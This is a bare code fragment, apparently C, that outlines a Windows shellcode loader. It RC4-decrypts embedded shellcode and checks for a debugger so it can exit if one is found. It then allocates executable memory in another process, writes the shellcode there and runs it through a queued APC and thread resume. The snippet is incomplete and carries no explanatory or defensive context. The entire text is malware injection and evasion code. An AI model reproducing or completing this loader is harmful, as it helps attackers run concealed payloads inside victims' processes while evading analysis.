GetModuleHandleA("ntdll.dll"); GetProcAddress(module, name);
rc4_init(&ctx, rc4_key, key_len); rc4_crypt(&ctx, encrypted_shellcode, size);
NtOpenProcess(&process, access, &attributes, &client_id);
NtQueryInformationProcess(process, 7, &debugPort, sizeof(debugPort), &size);
if (debugPort == 0xFFFFFFFF) return 0;
NtAllocateVirtualMemory(process, &base, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
NtWriteVirtualMemory(process, base, encrypted_shellcode, size, &written);
NtQueueApcThread(thread, base, base, 0, 0);
NtAlertResumeThread(thread, &previous);
